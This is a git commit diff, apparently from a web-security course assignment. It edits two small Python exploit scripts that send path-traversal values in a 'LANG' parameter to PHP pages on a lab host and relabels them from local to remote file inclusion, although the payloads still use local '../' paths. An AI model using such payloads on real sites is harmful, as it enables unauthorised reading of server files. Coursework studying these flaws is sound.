9424cb91927d3d5ac78226bdc03b23640d07ff66
MX Chai <mingxuan@live.com.sg>
2018-03-19 14:00:43 +0800

    Reclassified case03 and 13 into rfi

--- case03.py
+++ case03.py
@@ -1,13 +1,13 @@
 import requests
 import webbrowser
 
-# Exploit: change the LANG to ../lfi.txt.php and server will write file contents
+# Exploit: change the LANG to ../rfi.txt.php and server will write file contents
 # to the webpage
-# Local File Inclusion
+# Remote File Inclusion
 
 def main():
     temp = '/tmp/case03.html'
-    payload = {'LANG':'../lfi.txt.php'}
+    payload = {'LANG':'../rfi.txt.php'}
 
     r = requests.post('http://wsb.com/Assignment2/case03/case03.php', data=payload)
     with open(temp, 'wb') as f:
--- case13.py
+++ case13.py
@@ -1,10 +1,10 @@
 import webbrowser
 
-# Exploit: basic local file inclusion without any mitigation 
+# Exploit: basic remote file inclusion without any mitigation 
 # on the server side
 
 def main():
-    webbrowser.open('http://wsb.com/Assignment2/case13/case13.php?LANG=../lfi.txt', 2)
+    webbrowser.open('http://wsb.com/Assignment2/case13/case13.php?LANG=../rfi.txt', 2)
 
 if __name__ == "__main__":
     main()
